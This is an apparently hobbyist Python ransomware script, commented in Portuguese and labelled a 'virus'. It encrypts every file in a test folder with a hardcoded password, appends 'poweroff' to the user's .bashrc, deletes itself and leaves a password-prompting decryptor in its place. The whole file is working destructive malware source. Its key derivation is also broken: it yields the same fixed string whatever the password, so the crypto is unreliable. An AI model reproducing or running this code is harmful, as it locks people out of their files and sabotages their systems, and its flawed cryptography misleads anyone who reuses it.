#!/usr/bin/python3

import os
from Crypto import Random
from Crypto.Cipher import AES

# padding para a função encrypt
def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

# função que encripta um bloco
def encrypt(message, key):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

# função que encripta um arquivo
def encrypt_file(file_name, key):
    key = str(list("0"*32 + key))
    key = key[:32]
    with open(file_name, "rb") as f:
        plaintext = f.read()
    enc = encrypt(plaintext, key)
    with open(file_name, "wb") as f:
        f.write(enc)

# texto a ser substituído no próprio arquivo do vírus
dec = """import os
from Crypto import Random
from Crypto.Cipher import AES

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\\0")

def decrypt_file(file_name, key):
    key = str(list("0"*32 + key))
    key = key[:32]
    with open(file_name, "rb") as f:
        ciphertext = f.read()
    dec = decrypt(ciphertext, key)
    with open(file_name, "wb") as f:
        f.write(dec)

key = input("xeroque: ")

# os.chdir(os.path.expanduser("~"))
os.chdir(os.path.expanduser("./teste/"))

for file in [ name for name in os.listdir(os.getcwd()) if os.path.isfile(os.path.join(os.getcwd(), name)) ]:
    try:
        decrypt_file(file, key)
    except PermissionError:
        pass

os.chdir(os.path.expanduser(".."))
os.system("bash")

"""

os.system("echo poweroff >> ~/.bashrc")

# nome do arquivo do vírus
filename = "virus.py"

os.system("rm " + filename)

with open(filename, "w") as f:
    f.write(dec)

# os.chdir(os.path.expanduser('~'))
os.chdir(os.path.expanduser("./teste/"))

for file in [name for name in os.listdir(os.getcwd()) if os.path.isfile(os.path.join(os.getcwd(), name))]:
    try:
        encrypt_file(file, "rolmes")
    except PermissionError:
        pass

